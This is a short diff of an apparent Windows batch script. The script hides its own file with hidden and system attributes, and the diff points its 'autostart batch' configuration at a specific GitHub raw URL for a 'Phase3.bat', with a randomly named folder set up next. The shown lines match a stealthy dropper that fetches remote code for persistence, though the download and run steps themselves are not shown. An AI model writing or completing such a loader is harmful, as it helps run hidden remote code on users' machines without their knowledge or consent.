@@ -15,7 +15,7 @@ attrib +h +s "%~f0" 2>nul
 :: =============================================
 :: CONFIG FOR AUTOSTART BATCH
 :: =============================================
-set "GIT_BAT_URL=https://raw.githubusercontent.com/username/repo/main/script.bat"
+set "GIT_BAT_URL=https://raw.githubusercontent.com/Vinodsmiley8/SOME-OF-MY-WORKS/main/Phase3.bat"
 
 :: RANDOM FOLDER
 set "RAND_FOLDER=%RANDOM%%RANDOM%"
